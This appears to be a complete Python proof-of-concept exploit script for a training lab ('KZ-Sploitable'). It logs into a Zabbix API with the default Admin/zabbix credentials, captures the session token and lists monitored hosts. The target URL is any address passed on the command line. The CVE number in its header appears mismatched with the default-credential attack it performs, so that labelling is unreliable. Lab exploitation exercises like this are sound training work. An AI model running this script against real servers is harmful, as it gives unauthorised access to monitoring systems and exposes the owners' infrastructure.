#!/usr/bin/env python3
"""Zabbix Default Authentication PoC (CVE-2024-22120)

Tests default admin/zabbix credentials on Zabbix web frontend.
Educational proof-of-concept for KZ-Sploitable lab.
"""

import sys
import json
import urllib.request


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://kz-zabbix-web:8080"
    print(f"[*] Target: {target}")
    print(f"[*] CVE: CVE-2024-22120")
    print(f"[*] Type: Default Credentials (admin/zabbix)")
    print()

    api_url = f"{target}/api_jsonrpc.php"

    auth_payload = json.dumps({
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "username": "Admin",
            "password": "zabbix"
        },
        "id": 1
    }).encode()

    print(f"[+] Attempting API login: Admin/zabbix")

    try:
        req = urllib.request.Request(api_url, data=auth_payload, method="POST")
        req.add_header("Content-Type", "application/json-rpc")
        req.add_header("User-Agent", "KZ-Sploitable-PoC/1.0")

        with urllib.request.urlopen(req, timeout=10) as resp:
            body = json.loads(resp.read().decode("utf-8"))

            if "result" in body and body["result"]:
                auth_token = body["result"]
                print(f"[+] SUCCESS: Authenticated with default credentials")
                print(f"[+] Auth token: {auth_token[:16]}...")
                print()

                host_payload = json.dumps({
                    "jsonrpc": "2.0",
                    "method": "host.get",
                    "params": {"output": ["hostid", "host", "name"]},
                    "auth": auth_token,
                    "id": 2
                }).encode()

                req2 = urllib.request.Request(api_url, data=host_payload, method="POST")
                req2.add_header("Content-Type", "application/json-rpc")

                with urllib.request.urlopen(req2, timeout=10) as resp2:
                    hosts = json.loads(resp2.read().decode("utf-8"))
                    if "result" in hosts:
                        print(f"[+] Monitored hosts ({len(hosts['result'])}):")
                        for h in hosts["result"][:10]:
                            print(f"    - {h.get('name', 'unknown')} (ID: {h.get('hostid')})")
            else:
                print(f"[-] Login failed: {body.get('error', {}).get('message', 'Unknown')}")

    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        print(f"[!] Connection failed: {e.reason}")
    except Exception as e:
        print(f"[!] Error: {e}")

    print()
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
